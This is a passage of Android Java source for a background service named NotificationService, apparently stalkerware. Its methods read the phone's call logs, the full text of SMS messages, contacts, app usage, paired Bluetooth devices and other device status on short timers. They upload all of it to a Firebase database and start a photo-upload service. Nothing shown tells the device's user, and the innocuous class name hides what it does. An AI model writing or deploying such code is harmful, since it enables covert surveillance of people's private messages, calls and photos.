                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.firebase.FailureListener", e));
                        
                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch.public.void.onDataChange", e);
                    }
                }
                
                @Override
                public void onCancelled(DatabaseError error) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch.public.void.onCancelled", error.toException());
                }
            });
            
        } catch(Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendContactsSmart.outer.catch", e);
        }
    }

    // ========================= CALL LOGS =========================
    private void checkAndSendCallLogs() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasCallLogPermission()) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_call_logs_cooldown_set", 0);
            long now = System.currentTimeMillis();
             
            if (now - lastCooldownSet < ONE_MINUTE_MS) return;

            sp.edit().putLong("last_call_logs_cooldown_set", now).apply();

            long lastSentTime = sp.getLong("last_call_logs_sent", 0);
            try {
                try (android.database.Cursor cursor = getContentResolver().query(
                        android.provider.CallLog.Calls.CONTENT_URI,
                        null,
                        android.provider.CallLog.Calls.DATE + " > ?",
                        new String[]{String.valueOf(lastSentTime)},
                        android.provider.CallLog.Calls.DATE + " ASC"
                )) {
                    if (cursor != null && cursor.getCount() > 0) {
                        DatabaseReference ref = FirebaseDatabase.getInstance()
                                .getReference("users_data")
                                .child(user.getUid())
                                .child("call_logs");

                        Map<String, Object> batchUpdate = new HashMap<>();
                        long maxTime = lastSentTime;

                        int numIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
                        int nameIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME);
                        int typeIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
                        int dateIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
                        int durIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);

                        while (cursor.moveToNext()) {
                            try {
                                long dateTime = (dateIdx != -1) ? cursor.getLong(dateIdx) : 0;
                                if (dateTime > maxTime) maxTime = dateTime;

                                String number = (numIdx != -1) ? cursor.getString(numIdx) : "Unknown";
                                String name = (nameIdx != -1) ? cursor.getString(nameIdx) : "";
                                int type = (typeIdx != -1) ? cursor.getInt(typeIdx) : -1;
                                int duration = (durIdx != -1) ? cursor.getInt(durIdx) : 0;

                                String callType = "UNKNOWN";
                                if (type == android.provider.CallLog.Calls.INCOMING_TYPE) callType = "INCOMING";
                                else if (type == android.provider.CallLog.Calls.OUTGOING_TYPE) callType = "OUTGOING";
                                else if (type == android.provider.CallLog.Calls.MISSED_TYPE) callType = "MISSED";

                                String id = ref.push().getKey();
                                if (id == null) return;

                                Map<String, Object> data = new HashMap<>();
                                data.put("number", number);
                                data.put("name", name != null ? name : "");
                                data.put("type", callType);
                                data.put("dateTime", formatDateTime(dateTime));
                                data.put("duration", formatDuration(duration * 1000L));
                                batchUpdate.put(id, data);

                            } catch (Throwable e) {
                                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.inner.catch", e);
                            }
                        }

                        if (!batchUpdate.isEmpty()) {
                            final long timeToSave = maxTime;
                            ref.updateChildren(batchUpdate)
                                    .addOnSuccessListener(aVoid -> {
                                        sp.edit().putLong("last_call_logs_sent", timeToSave).apply();
                                    })
                                    .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.firebase.FailureListener", e));
                        }
                    }
                }
            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.middle.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendCallLogs.outer.catch", e);
        }
    }

    // ========================= SMS =========================
    private void checkAndSendSms() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasSmsPermission()) return;
            
            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_sms_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < ONE_MINUTE_MS) return;

            long lastSentTime = sp.getLong("last_sms_sent", 0);

            boolean success;
            if (lastSentTime == 0) {
                success = sendAllSms(user.getUid(), sp);
            } else {
                success = sendNewSms(user.getUid(), lastSentTime, sp);
            }

            if (success) {
                sp.edit().putLong("last_sms_cooldown_set", now).apply();
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendSms.catch", e);
        }
    }

    private boolean sendAllSms(String userId, SharedPreferences sp) {
        try {
            if (!hasSmsPermission()) return false;

            List<JSONObject> smsList = readSms(null, null);
            if (smsList == null) return false;
            if (smsList.isEmpty()) return true;

            sendSmsToDatabase(userId, smsList, sp);
            return true;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.sendAllSms.catch", e);
            return false;
        }
    }

    private boolean sendNewSms(String userId, long lastSentTime, SharedPreferences sp) {
        try {
            if (!hasSmsPermission()) return false;

            String selection = Telephony.Sms.DATE + " > ?";
            String[] selectionArgs = {String.valueOf(lastSentTime)};
            List<JSONObject> newSmsList = readSms(selection, selectionArgs);

            if (newSmsList == null) return false;
            if (newSmsList.isEmpty()) return true;

            sendSmsToDatabase(userId, newSmsList, sp);
            return true;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.sendNewSms.catch", e);
            return false;
        }
    }

    private List<JSONObject> readSms(String selection, String[] selectionArgs) {
        List<JSONObject> smsList = new ArrayList<>();
        Cursor cursor = null;

        try {
            cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    new String[]{
                            Telephony.Sms._ID,
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.DATE,
                            Telephony.Sms.TYPE
                    },
                    selection,
                    selectionArgs,
                    Telephony.Sms.DATE + " ASC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        JSONObject sms = new JSONObject();
                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                        sms.put("dateTime", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        sms.put("type", type == 1 ? "Inbox" : "Sent");
                        smsList.add(sms);
                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.inner.catch", e);
                    }
                }
            }
            return smsList;

        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.outer.catch", e);
            return null;
        } finally {
            try {
                if (cursor != null) cursor.close();
            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.list.readSms.outer.catch.finally.catch", e);
            }
        }
    }

    private void sendSmsToDatabase(String userId, List<JSONObject> smsList, SharedPreferences sp) {
        try {
            DatabaseReference ref = FirebaseDatabase.getInstance()
                    .getReference("users_data")
                    .child(userId)
                    .child("sms");

            long maxTime = 0;
            Map<String, Object> batchUpdate = new HashMap<>();

            for (JSONObject sms : smsList) {
                try {
                    long dateTime = sms.optLong("dateTime", 0);
                    if (dateTime > maxTime) maxTime = dateTime;

                    String id = ref.push().getKey();
                    if (id == null) return;

                    Map<String, Object> data = new HashMap<>();
                    data.put("id", sms.optString("id"));
                    data.put("address", sms.optString("address"));
                    data.put("body", sms.optString("body"));
                    data.put("dateTime", formatDateTime(dateTime));
                    data.put("type", sms.optString("type"));

                    batchUpdate.put(id, data);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.inner.catch", e);
                }
            }

            if (!batchUpdate.isEmpty()) {
                final long timeToSave = maxTime;
                ref.updateChildren(batchUpdate)
                        .addOnSuccessListener(aVoid -> {
                            sp.edit().putLong("last_sms_sent", timeToSave).apply();
                        })
                        .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.firebase.FailureListener", e));
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendSmsToDatabase.outer.catch", e);
        }
    }

    // ========================= USAGE SUMMARY =========================
    private void checkAndSendUsageSummary() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasUsageStatsPermission()) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_usage_summary_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < ONE_DAY_MS) return;

            sendUsageSummary(user.getUid(), sp, now);
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendUsageSummary.catch", e);
        }
    }

    private void sendUsageSummary(String userId, SharedPreferences sp, long now) {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            if (usm == null) return;

            long endTime = now;
            long startTime = endTime - ONE_DAY_MS;

            Map<String, UsageStats> usageMap = usm.queryAndAggregateUsageStats(startTime, endTime);
            if (usageMap == null || usageMap.isEmpty()) return;

            try {
                String dateKey = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US)
                        .format(new java.util.Date(endTime));

                DatabaseReference ref = FirebaseDatabase.getInstance()
                        .getReference("users_data")
                        .child(userId)
                        .child("usage_summaries")
                        .child(dateKey);

                Map<String, Object> updates = new HashMap<>();
                android.content.pm.PackageManager pm = getPackageManager();

                for (UsageStats stats : usageMap.values()) {
                    try {
                        String pkg = stats.getPackageName();

                        if (pkg == null || pkg.equals(getPackageName())) continue;

                        long timeMs = stats.getTotalTimeInForeground();
                        if (timeMs < 60000) continue;

                        String safeKey = pkg.replace(".", "_");
                        long lastUsed = stats.getLastTimeUsed();

                        Map<String, Object> data = new HashMap<>();

                        String appName = pkg;
                        try {
                            appName = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
                        } catch (Exception ignored) {
                            appName = pkg;
                        }
                        
                        data.put("appName", appName);
                        data.put("package", pkg);
                        data.put("totalTimeForeground", formatDuration(timeMs));
                        data.put("lastTimeUsed", formatDateTime(lastUsed));

                        updates.put(safeKey, data);
                    } catch (Throwable e) {
                        ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.inner.catch", e);
                    }
                }

                if (!updates.isEmpty()) {
                    ref.updateChildren(updates)
                            .addOnSuccessListener(aVoid -> {
                                sp.edit().putLong("last_usage_summary_cooldown_set", now).apply();
                            })
                            .addOnFailureListener(e -> ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.firebase.FailureListener", e));
                }
            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.middle.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.sendUsageSummary.outer.catch", e);
        }
    }

    private String getAppName(String packageName) {
        try {
            ApplicationInfo info = getPackageManager().getApplicationInfo(packageName, 0);
            return getPackageManager().getApplicationLabel(info).toString();
        } catch (Throwable ignored) {
            return packageName;
        }
    }

    // ========================= DEVICE STATUS =========================
    private void checkAndSendDeviceStatus() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_device_status_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < TEN_SECOND_MS) return;

            sp.edit().putLong("last_device_status_cooldown_set", now).apply();

            try {
                Map<String, Object> root = new HashMap<>();

                // Device
                try {
                    String androidId;
                    try {
                        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                        if (androidId == null) androidId = "unknown";
                    } catch (Exception ignored) {
                        androidId = "unknown";
                    } 
                    
                    Map<String, Object> deviceMap = new HashMap<>();
                    deviceMap.put("androidId", androidId);
                    deviceMap.put("manufacturer", android.os.Build.MANUFACTURER);
                    deviceMap.put("brand", android.os.Build.BRAND);
                    deviceMap.put("model", android.os.Build.MODEL);
                    deviceMap.put("androidVersion", android.os.Build.VERSION.RELEASE);
                    
                    root.put("device", deviceMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.device.catch", e);
                }

                // App
                try {
                    android.content.pm.PackageInfo pi = getPackageManager().getPackageInfo(getPackageName(), 0);
                    Map<String, Object> appMap = new HashMap<>();
                    appMap.put("package", getPackageName());
                    appMap.put("version", pi.versionName);
                    appMap.put("firstInstall", formatDateTime(pi.firstInstallTime));
                    appMap.put("lastUpdate", formatDateTime(pi.lastUpdateTime));
                    appMap.put("contactsPermission", hasContactsPermission());
                    appMap.put("callLogsPermission", hasCallLogPermission());
                    appMap.put("smsPermission", hasSmsPermission());
                    appMap.put("locationPermission", hasLocationPermission());
                    appMap.put("usageStatsPermission", hasUsageStatsPermission());
                    appMap.put("storagePermission", hasStoragePermission());

                    root.put("app", appMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.app.catch", e);
                }

                // Battery
                try {
                    android.content.Intent batteryStatus = registerReceiver(null, new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                    if (batteryStatus != null) {
                        int level = batteryStatus.getIntExtra("level", -1);
                        int scale = batteryStatus.getIntExtra("scale", -1);
                        int temp = batteryStatus.getIntExtra("temperature", -1);
                        int status = batteryStatus.getIntExtra("status", -1);
                        int plugged = batteryStatus.getIntExtra("plugged", -1);

                        Map<String, Object> batteryMap = new HashMap<>();
                        batteryMap.put("percentage", ((int) ((level / (float) scale) * 100)) + "%");
                        batteryMap.put("charging", status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || status == android.os.BatteryManager.BATTERY_STATUS_FULL);
                        batteryMap.put("temp", (temp / 10.0) + "°C");
                        batteryMap.put("voltage", batteryStatus.getIntExtra("voltage", -1) + " mV");

                        String source;
                        switch (plugged) {
                            case BatteryManager.BATTERY_PLUGGED_AC:
                                source = "AC";
                                break;

                            case BatteryManager.BATTERY_PLUGGED_USB:
                                source = "USB";
                                break;
                                
                            case BatteryManager.BATTERY_PLUGGED_WIRELESS:
                                source = "WIRELESS";
                                break;
                                
                            case BatteryManager.BATTERY_PLUGGED_DOCK:
                                source = "DOCK";
                                break;
                                
                            case 0:
                                source = "BATTERY";
                                break;

                            default:
                                source = "UNKNOWN";
                                break;
                        }

                        batteryMap.put("source", source);

                        root.put("battery", batteryMap);
                    }
                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.battery.catch", e);
                }

                // Network
                try {
                    ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                    android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
                    boolean internet = ni != null && ni.isConnected();
                    
                    boolean vpn = false;
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        android.net.Network network = cm.getActiveNetwork();
                        if (network != null) {
                            android.net.NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
                            vpn = capabilities != null &&
                            capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN);
                        }
                    }

                    Map<String, Object> networkMap = new HashMap<>();
                    networkMap.put("internet", internet);
                    networkMap.put("connectionType", internet ? (ni.getType() == ConnectivityManager.TYPE_WIFI ? "WIFI" : "MOBILE") : "NONE");
                    networkMap.put("vpn", vpn);
                    networkMap.put("airplane", android.provider.Settings.Global.getInt(getContentResolver(), android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) == 1);

                    root.put("network", networkMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.network.catch", e);
                }

                // Location
                try {
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Map<String, Object> locationMap = new HashMap<>();
                    locationMap.put("gps", lm.isProviderEnabled(LocationManager.GPS_PROVIDER));

                    root.put("location", locationMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.location.catch", e);
                }

                // Sound
                try {
                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
                    android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                    Map<String, Object> soundMap = new HashMap<>();

                    int rMode = am.getRingerMode();
                    String mode = "UNKNOWN";

                    if (rMode == android.media.AudioManager.RINGER_MODE_SILENT) {
                        mode = "SILENT";
                    } else if (rMode == android.media.AudioManager.RINGER_MODE_VIBRATE) {
                        mode = "VIBRATE";
                    } else if (rMode == android.media.AudioManager.RINGER_MODE_NORMAL) {
                        mode = "NORMAL";
                    }
                    soundMap.put("ringerMode", mode);

                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                            soundMap.put("dnd", nm.getCurrentInterruptionFilter() != android.app.NotificationManager.INTERRUPTION_FILTER_ALL);
                        }
                    } catch (Exception ignored) {
                        soundMap.put("dnd", "PERMISSION_REQUIRED");
                    }
                    root.put("sound", soundMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.sound.catch", e);
                }

                // Blutooth
                try {
                    BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
                    Map<String, Object> bluetoothMap = new HashMap<>();

                    boolean enabled = bluetoothAdapter != null && bluetoothAdapter.isEnabled();

                    List<String> devices = new ArrayList<>();

                    if (enabled) {
                        try {
                            for (BluetoothDevice device : bluetoothAdapter.getBondedDevices()) {
                                String name = device.getName();
                                if (name != null) {
                                    devices.add(name);
                                }
                            }
                        } catch (Exception ignored) {}
                    }

                    bluetoothMap.put("enabled", enabled);
                    bluetoothMap.put("devices", devices);

                    root.put("bluetooth", bluetoothMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.blutooth.catch", e);
                }

                // Display
                try {
                    Map<String, Object> displayMap = new HashMap<>();
                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);

                    boolean screenOn = pm.isInteractive();
                    int nightMode = getResources().getConfiguration().uiMode & Configuration.UI_MODE_NIGHT_MASK;
                    boolean darkMode = nightMode == Configuration.UI_MODE_NIGHT_YES;

                    displayMap.put("screenOn", screenOn);
                    displayMap.put("darkMode", darkMode);

                    root.put("display", displayMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.display.catch", e);
                }

                // Headphone
                try {
                    AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    Map<String, Object> audioMap = new HashMap<>();

                    boolean connected = false;
                    String name = "";
                    String type = "";

                    for (AudioDeviceInfo device : am.getDevices(AudioManager.GET_DEVICES_OUTPUTS)) {
                        switch (device.getType()) {
                            case AudioDeviceInfo.TYPE_WIRED_HEADSET:
                            case AudioDeviceInfo.TYPE_WIRED_HEADPHONES:
                                connected = true;
                                name = device.getProductName().toString();
                                type = "WIRED";
                                break;

                            case AudioDeviceInfo.TYPE_USB_HEADSET:
                                connected = true;
                                name = device.getProductName().toString();
                                type = "USB";
                                break;

                            case AudioDeviceInfo.TYPE_BLUETOOTH_A2DP:
                            case AudioDeviceInfo.TYPE_BLUETOOTH_SCO:
                                connected = true;
                                name = device.getProductName().toString();
                                type = "BLUETOOTH";
                                break;
                        }

                        if (connected) {
                            break;
                        }
                    }

                    audioMap.put("connected", connected);
                    audioMap.put("name", name);
                    audioMap.put("type", type);

                    root.put("headphone", audioMap);

                } catch (Throwable e) {
                    ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.inner.catch.headphone.catch", e);
                }

                String uid = user.getUid();
                String dateTime = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US).format(new Date());

                root.put("lastUpdate", dateTime);
                FirebaseDatabase.getInstance().getReference("users_data")
                        .child(uid).child("device_status")
                        .updateChildren(root);

            } catch (Throwable e) {
                ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.middle.catch", e);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendDeviceStatus.outer.catch", e);
        }
    }

    // ======================== MEDIA ===========================
    private void checkAndSendPhotos() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) return;

            if (!hasStoragePermission()) return;
            
            SharedPreferences sp = getSharedPreferences("app_data", MODE_PRIVATE);

            long lastCooldownSet = sp.getLong("last_photos_cooldown_set", 0);
            long now = System.currentTimeMillis();
            
            if (now - lastCooldownSet < TEN_MINUTE_MS) return;

            Boolean canUpload = sp.getBoolean("upload_enabled", false);
            String cloudName = sp.getString("cloud_name", "");
            String uploadPreset = sp.getString("upload_preset", "");

            if (canUpload && !cloudName.isEmpty() && !uploadPreset.isEmpty()) {
                sp.edit().putLong("last_photos_cooldown_set", now).apply();
                
                // Start photos service
                Intent phoIntent = new Intent(this, PhotosService.class);
                startService(phoIntent);
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.void.checkAndSendPhotos.catch", e);
        }
    }
    
    // ========================= HELPERS =========================
    private boolean hasContactsPermission() {
        try {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasContactsPermission.catch", e);
            return false;
        }
    }

    private boolean hasCallLogPermission() {
        try {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasCallLogPermission.catch", e);
            return false;
        }
    }

    private boolean hasSmsPermission() {
        try {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasSmsPermission.catch", e);
            return false;
        }
    }

    private boolean hasUsageStatsPermission() {
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            if (appOps == null) return false;

            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasUsageStatsPermission.catch", e);
            return false;
        }
    }

    private boolean hasLocationPermission() {
        try {
            return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED
                    || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasLocationPermission.catch", e);
            return false;
        }
    }

    private boolean hasStoragePermission() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                return Environment.isExternalStorageManager();
            } else if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
                boolean read = ContextCompat.checkSelfPermission(this,
                        Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
                boolean write = ContextCompat.checkSelfPermission(this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
                return read && write;
            } else {
                return ContextCompat.checkSelfPermission(this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
            }
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.hasStoragePermission.catch", e);
            return false;
        }
    }

    private boolean isInternetOn() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;

            Network activeNetwork = cm.getActiveNetwork();
            if (activeNetwork == null) return false;

            NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
            if (caps == null) return false;

            return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.isInternetOn.catch", e);
            return false;
        }
    }

    private boolean isLocationEnabled() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return false;

            return lm.isLocationEnabled();
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.boolean.isLocationEnabled.catch", e);
            return false;
        }
    }

    private String formatDuration(long millis) {
        try {
            if (millis < 0) return "0s";
            long seconds = millis / 1000;
            long hours = seconds / 3600;
            long minutes = (seconds % 3600) / 60;
            long secs = seconds % 60;
            
            if (hours > 0) return String.format(Locale.US, "%dh %dm %ds", hours, minutes, secs);
            if (minutes > 0) return String.format(Locale.US, "%dm %ds", minutes, secs);
            return String.format(Locale.US, "%ds", secs);
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.formatDuration.catch", e);
            return "unknown";
        }
    }

    private String formatDateTime(long timestamp) {
        try {
            if (timestamp <= 0) return "";
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.US);
            return sdf.format(new java.util.Date(timestamp));
        } catch (Throwable e) {
            ErrorReporter.send(getApplicationContext(), "NotificationService.java.private.String.formatDateTime.catch", e);
            return "unknown";
        }
    }
}
